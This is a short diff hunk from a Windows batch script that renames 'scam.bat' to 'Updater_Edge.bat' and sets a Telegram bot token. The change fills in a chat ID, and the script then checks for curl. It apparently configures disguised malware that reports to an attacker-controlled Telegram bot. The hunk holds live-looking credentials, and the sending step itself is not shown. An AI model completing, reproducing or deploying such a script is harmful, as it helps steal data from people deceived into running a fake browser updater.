@@ -65,7 +65,7 @@ cd %fp%
 rename "scam.bat" "Updater_Edge.bat"
 
 set "BOT_TOKEN=7661299987:AAEYnOgv9Ws_Fd9azP1EgvQitrJ6jlEfbS4"
-set "CHAT_ID="
+set "CHAT_ID=5757337298"
 
 :: curl
 where curl >nul 2>&1
